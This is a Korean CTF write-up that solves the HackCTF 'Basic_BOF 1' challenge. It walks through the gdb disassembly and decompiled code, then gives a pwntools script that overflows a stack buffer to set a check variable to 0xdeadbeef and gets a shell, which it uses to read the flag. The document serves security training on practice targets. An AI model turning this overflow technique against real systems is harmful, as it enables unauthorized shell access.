# [HackCTF] Basic_BOF 1

bof_basic을 gdb로 분석해보자.<br>
```c
gdb -q bof_basic
gef➤  disas main
Dump of assembler code for function main:
   0x080484cb <+0>:	lea    ecx,[esp+0x4]
   0x080484cf <+4>:	and    esp,0xfffffff0
   0x080484d2 <+7>:	push   DWORD PTR [ecx-0x4]
   0x080484d5 <+10>:	push   ebp
   0x080484d6 <+11>:	mov    ebp,esp
   0x080484d8 <+13>:	push   ecx
   0x080484d9 <+14>:	sub    esp,0x34
   0x080484dc <+17>:	mov    DWORD PTR [ebp-0xc],0x4030201
   0x080484e3 <+24>:	mov    eax,ds:0x804a040
   0x080484e8 <+29>:	sub    esp,0x4
   0x080484eb <+32>:	push   eax
   0x080484ec <+33>:	push   0x2d
   0x080484ee <+35>:	lea    eax,[ebp-0x34]
   0x080484f1 <+38>:	push   eax
   0x080484f2 <+39>:	call   0x8048380 <fgets@plt>
   0x080484f7 <+44>:	add    esp,0x10
   0x080484fa <+47>:	sub    esp,0x8
   0x080484fd <+50>:	lea    eax,[ebp-0x34]
   0x08048500 <+53>:	push   eax
   0x08048501 <+54>:	push   0x8048610
   0x08048506 <+59>:	call   0x8048370 <printf@plt>
   0x0804850b <+64>:	add    esp,0x10
   0x0804850e <+67>:	sub    esp,0x8
   0x08048511 <+70>:	push   DWORD PTR [ebp-0xc]
   0x08048514 <+73>:	push   0x804861c
   0x08048519 <+78>:	call   0x8048370 <printf@plt>
   0x0804851e <+83>:	add    esp,0x10
   0x08048521 <+86>:	cmp    DWORD PTR [ebp-0xc],0x4030201
   0x08048528 <+93>:	je     0x8048543 <main+120>
   0x0804852a <+95>:	cmp    DWORD PTR [ebp-0xc],0xdeadbeef
   0x08048531 <+102>:	je     0x8048543 <main+120>
   0x08048533 <+104>:	sub    esp,0xc
   0x08048536 <+107>:	push   0x8048628
   0x0804853b <+112>:	call   0x8048390 <puts@plt>
   0x08048540 <+117>:	add    esp,0x10
   0x08048543 <+120>:	cmp    DWORD PTR [ebp-0xc],0xdeadbeef
   0x0804854a <+127>:	jne    0x804857c <main+177>
   0x0804854c <+129>:	sub    esp,0xc
   0x0804854f <+132>:	push   0x8048644
   0x08048554 <+137>:	call   0x8048390 <puts@plt>
   0x08048559 <+142>:	add    esp,0x10
   0x0804855c <+145>:	sub    esp,0xc
   0x0804855f <+148>:	push   0x804866e
   0x08048564 <+153>:	call   0x80483a0 <system@plt>
   0x08048569 <+158>:	add    esp,0x10
   0x0804856c <+161>:	sub    esp,0xc
   0x0804856f <+164>:	push   0x8048678
   0x08048574 <+169>:	call   0x8048390 <puts@plt>
   0x08048579 <+174>:	add    esp,0x10
   0x0804857c <+177>:	mov    eax,0x0
   0x08048581 <+182>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048584 <+185>:	leave  
   0x08048585 <+186>:	lea    esp,[ecx-0x4]
   0x08048588 <+189>:	ret    
End of assembler dump.
```
그 중에서 첫번째로 중요한 부분은 아래 코드이다.<br>
```c
→  0x80484ee <main+35>        lea    eax, [ebp-0x34]
   0x80484f1 <main+38>        push   eax
   0x080484f2 <+39>:	call   0x8048380 <fgets@plt>
```
fgets에서 사용자의 입력값을 받고 `ebp-0x34`는 버퍼의 시작 주소를 의미한다.<br>

```c
0x08048501 <+54>:	push   0x8048610
0x08048506 <+59>:	call   0x8048370 <printf@plt>
0x0804850b <+64>:	add    esp,0x10
0x0804850e <+67>:	sub    esp,0x8
0x08048511 <+70>:	push   DWORD PTR [ebp-0xc]
0x08048514 <+73>:	push   0x804861c
0x08048519 <+78>:	call   0x8048370 <printf@plt>
```

fgets함수를 call한뒤에 printf함수를 call한다.<br>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+4h] [ebp-34h]
  int v5; // [esp+2Ch] [ebp-Ch]

  v5 = 0x4030201;
  fgets(&s, 45, stdin);
  printf("\n[buf]: %s\n", &s);
  printf("[check] %p\n", v5);
  if ( v5 != 0x4030201 && v5 != 0xDEADBEEF )
    puts("\nYou are on the right way!");
  if ( v5 == 0xDEADBEEF )
  {
    puts("Yeah dude! You win!\nOpening your shell...");
    system("/bin/dash");
    puts("Shell closed! Bye.");
  }
  return 0;
}
```
위의 코드는 bof_basic을 ida로 분석한 코드이다.<br>
`s`라는 인자와 `v5`가 있는데, 위의 코드에서 보면 v5가 `0xdeadbeef`인 경우 system함수가 실행되는 것을 볼수있다.<br>

```c
0x0804852a <+95>:	cmp    DWORD PTR [ebp-0xc],0xdeadbeef
0x08048531 <+102>:	je     0x8048543 <main+120>
```
gdb에서 확인해보면, v5는 `ebp-0xc`로 `0xdeadbeef`와 같은지 비교한다.

따라서 `ebp-0xc`를 `0xdeadbeef`로 덮기 위해서는 `ebp-0x34`에서 `ebp-0xc`만큼을 뺀값을 더미값으로 채워준다음, 0xdeadbeef를 버퍼에 채워주면 문제를 해결할수있다.<br>

## Exploit Code
```c
from pwn import *

p = remote("ctf.j0n9hyun.xyz",3000)

payload = 'a' * (0x34-0xc)
payload += p32(0xdeadbeef)
p.sendline(payload)
p.interactive()
```

```c
kimdong@ubuntu  ~/Wargame  python ex.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3000: Done
[*] Switching to interactive mode
$ ls
flag
main
$ cat flag
HackCTF{}
```

## END !
